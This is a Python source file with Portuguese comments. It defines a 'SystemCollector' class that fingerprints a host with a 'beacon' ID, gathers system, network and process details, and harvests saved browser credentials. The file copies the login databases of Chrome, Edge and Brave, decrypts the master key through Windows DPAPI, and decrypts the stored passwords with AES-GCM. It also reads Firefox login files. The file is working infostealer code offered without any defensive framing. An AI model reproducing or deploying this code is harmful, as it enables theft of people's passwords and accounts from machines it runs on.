import platform
import os
import socket
import json
import subprocess
import datetime
import psutil
import getpass
import sqlite3
import base64
import tempfile
import shutil
import sys
import ctypes
import ctypes.wintypes

class SystemCollector:
    """
    Coleta informações detalhadas do sistema host, incluindo credenciais de navegadores.
    """
    def __init__(self):
        self.data = {}

    def collect(self):
        """
        Executa todas as rotinas de coleta e retorna um dicionário.
        """
        self.data = {
            "meta": {
                "timestamp": datetime.datetime.now().isoformat(),
                "beacon_id": self._get_beacon_id(),
                "script_version": "1.2.0"
            },
            "os": self._get_os_info(),
            "network": self._get_network_info(),
            "hardware": self._get_hardware_info(),
            "processes": self._get_process_summary(),
            "security": self._get_security_context(),
            "environment": self._get_environment_info(),
            "disk_usage": self._get_disk_usage(),
            "credentials": self._get_browser_credentials(),
            "raw_output": self._get_raw_system_output()
        }
        return self.data

    def _get_beacon_id(self):
        """Gera um ID único baseado no hardware para identificar o host."""
        try:
            interfaces = psutil.net_if_addrs()
            for iface, addrs in interfaces.items():
                for addr in addrs:
                    if addr.family == socket.AF_INET and addr.address != '127.0.0.1':
                        return f"{socket.gethostname()}-{addr.address.replace('.', '_')}"
            return socket.gethostname()
        except Exception:
            return socket.gethostname()

    def _get_os_info(self):
        return {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "python_version": platform.python_version(),
            "hostname": socket.gethostname(),
            "fqdn": socket.getfqdn()
        }

    def _get_network_info(self):
        interfaces = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        io_counters = psutil.net_io_counters()
        
        net_info = {
            "interfaces": {},
            "stats": {},
            "io_counters": {
                "bytes_sent": io_counters.bytes_sent,
                "bytes_recv": io_counters.bytes_recv
            }
        }

        for iface, addrs in interfaces.items():
            interface_details = []
            for addr in addrs:
                family_name = "Unknown"
                if addr.family == socket.AF_INET:
                    family_name = "IPv4"
                elif addr.family == socket.AF_INET6:
                    family_name = "IPv6"
                
                interface_details.append({
                    "family": family_name,
                    "address": addr.address,
                    "netmask": addr.netmask
                })
            net_info["interfaces"][iface] = interface_details
            
        for iface, stats in stats.items():
            net_info["stats"][iface] = {
                "isup": stats.isup,
                "speed": stats.speed
            }
            
        return net_info

    def _get_hardware_info(self):
        cpu_freq = psutil.cpu_freq()
        virtual_mem = psutil.virtual_memory()
        
        return {
            "cpu": {
                "count_logical": psutil.cpu_count(logical=True),
                "count_physical": psutil.cpu_count(logical=False),
                "percent": psutil.cpu_percent(interval=1),
                "freq_current": cpu_freq.current if cpu_freq else None
            },
            "memory": {
                "total_bytes": virtual_mem.total,
                "available_bytes": virtual_mem.available,
                "percent_used": virtual_mem.percent
            }
        }

    def _get_process_summary(self):
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'memory_percent', 'cmdline', 'username']):
            try:
                procs.append({
                    "pid": p.info['pid'],
                    "name": p.info['name'],
                    "memory_percent": p.info['memory_percent'],
                    "cmdline": p.info['cmdline'],
                    "username": p.info['username']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        procs.sort(key=lambda x: x['memory_percent'] or 0, reverse=True)
        return procs[:50]

    def _get_security_context(self):
        return {
            "current_user": getpass.getuser(),
            "uid": os.getuid() if hasattr(os, 'getuid') else None,
            "euid": os.geteuid() if hasattr(os, 'geteuid') else None,
            "is_root": os.geteuid() == 0 if hasattr(os, 'geteuid') else False
        }

    def _get_environment_info(self):
        env_keys = ['PATH', 'HOME', 'USER', 'SHELL', 'LANG', 'PWD', 'EDITOR']
        return {k: os.environ.get(k) for k in env_keys if os.environ.get(k)}

    def _get_disk_usage(self):
        partitions = []
        for part in psutil.disk_partitions(all=True):
            try:
                usage = psutil.disk_usage(part.mountpoint)
                partitions.append({
                    "device": part.device,
                    "mountpoint": part.mountpoint,
                    "total_gb": round(usage.total / (1024**3), 2),
                    "used_gb": round(usage.used / (1024**3), 2),
                    "percent": usage.percent
                })
            except (PermissionError, OSError):
                continue
        return partitions

    def _get_browser_credentials(self):
        """
        Extrai credenciais de navegadores populares.
        Suporta: Chrome, Edge, Brave, Firefox (Windows/Linux)
        """
        creds = []
        user_profile = os.environ.get('USERPROFILE', os.path.expanduser("~"))
        
        if platform.system() == "Windows":
            chromium_based_paths = {
                "Chrome": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
                "Edge": os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
                "Brave": os.path.join(user_profile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
            }
            
            # Obter a Master Key para Chrome/Edge
            master_key = self._get_chromium_master_key(user_profile)
            
            for browser_name, path in chromium_based_paths.items():
                if os.path.exists(path):
                    creds.extend(self._extract_chromium_creds(path, browser_name, master_key))
            
            # Firefox
            firefox_profiles_dir = os.path.join(user_profile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
            if os.path.exists(firefox_profiles_dir):
                for profile in os.listdir(firefox_profiles_dir):
                    if profile.endswith('.default') or 'default-release' in profile:
                        logins_file = os.path.join(firefox_profiles_dir, profile, "logins.json")
                        if os.path.exists(logins_file):
                            creds.extend(self._extract_firefox_creds(logins_file))
                            
        elif platform.system() == "Linux":
            chromium_based_paths = {
                "Chrome": os.path.join(user_profile, ".config", "google-chrome", "Default", "Login Data"),
                "Chromium": os.path.join(user_profile, ".config", "chromium", "Default", "Login Data"),
                "Brave": os.path.join(user_profile, ".config", "BraveSoftware", "Brave-Browser", "Default", "Login Data")
            }
            for browser_name, path in chromium_based_paths.items():
                if os.path.exists(path):
                    # No Linux, a chave geralmente vem do Keyring, mas podemos tentar senhas padrão ou retornar criptografado
                    creds.extend(self._extract_chromium_creds(path, browser_name, None))
                    
            firefox_profiles_dir = os.path.join(user_profile, ".mozilla", "firefox")
            if os.path.exists(firefox_profiles_dir):
                for profile in os.listdir(firefox_profiles_dir):
                    if profile.endswith('.default') or 'default-release' in profile:
                        logins_file = os.path.join(firefox_profiles_dir, profile, "logins.json")
                        if os.path.exists(logins_file):
                            creds.extend(self._extract_firefox_creds(logins_file))

        return creds

    def _get_chromium_master_key(self, user_profile):
        """Extrai a Master Key do arquivo Local State para Chrome/Edge."""
        local_state_paths = [
            os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"),
            os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State"),
            os.path.join(user_profile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
        ]
        
        for path in local_state_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    encrypted_key_b64 = data['os_crypt']['encrypted_key']
                    encrypted_key = base64.b64decode(encrypted_key_b64)
                    # Remove o prefixo 'DPAPI'
                    if encrypted_key.startswith(b'DPAPI'):
                        encrypted_key = encrypted_key[5:]
                    # Descriptografa com DPAPI
                    master_key = self._dpapi_decrypt(encrypted_key)
                    return master_key
                except Exception as e:
                    print(f"Error getting master key: {e}")
        return None

    def _dpapi_decrypt(self, encrypted_blob):
        """Descriptografa um blob usando a API DPAPI do Windows."""
        if sys.platform != 'win32':
            return None
            
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))
            ]
            
        blob_in = DATA_BLOB(len(encrypted_blob), ctypes.cast(ctypes.create_string_buffer(encrypted_blob, len(encrypted_blob)), ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()
        
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted
        return None

    def _extract_chromium_creds(self, db_path, browser_name, master_key):
        """Extrai credenciais de bancos de dados estilo Chromium."""
        creds = []
        try:
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "Login Data")
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            
            for origin_url, username, encrypted_password in rows:
                password_decrypted = None
                if encrypted_password and master_key:
                    # Remove o prefixo v10/v11
                    if encrypted_password[:3] in (b'v10', b'v11', b'v20'):
                        password_decrypted = self._decrypt_chromium_password(encrypted_password, master_key)
                
                creds.append({
                    "browser": browser_name,
                    "url": origin_url,
                    "username": username,
                    "password_decrypted": password_decrypted,
                    "password_encrypted": encrypted_password.hex() if encrypted_password else None
                })
                
            conn.close()
            shutil.rmtree(temp_dir, ignore_errors=True)
        except Exception as e:
            print(f"Error extracting {browser_name} creds: {e}")
        return creds

    def _decrypt_chromium_password(self, encrypted_password, master_key):
        """Descriptografa a senha do Chromium usando AES-256-GCM."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            # Estrutura: prefixo (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:]
            aesgcm = AESGCM(master_key)
            decrypted = aesgcm.decrypt(nonce, ciphertext, None)
            return decrypted.decode('utf-8')
        except ImportError:
            # Fallback se a biblioteca cryptography não estiver instalada
            # Retorna a senha criptografada em hex como fallback
            return encrypted_password.hex()
        except Exception as e:
            return f"Decryption Error: {str(e)}"

    def _extract_firefox_creds(self, logins_json_path):
        """Extrai credenciais do Firefox (logins.json)."""
        creds = []
        try:
            with open(logins_json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            if 'logins' in data:
                for login in data['logins']:
                    creds.append({
                        "browser": "Firefox",
                        "url": login.get('hostname'),
                        "username": login.get('usernameValue'),
                        "password_encrypted": login.get('encryptedValue'),
                        "password_decrypted": None, # Firefox usa Keyring, difícil de decifrar sem a chave
                        "guid": login.get('guid')
                    })
        except Exception as e:
            print(f"Error extracting Firefox creds: {e}")
        return creds

    def _get_raw_system_output(self):
        commands = {
            "uname": "uname -a",
            "whoami": "whoami",
            "net": "ip addr" if os.name == 'posix' else "ipconfig /all"
        }
        raw = {}
        for key, cmd in commands.items():
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                raw[key] = result.stdout.strip()[:2000]
            except Exception as e:
                raw[key] = f"Error: {str(e)}"
        return raw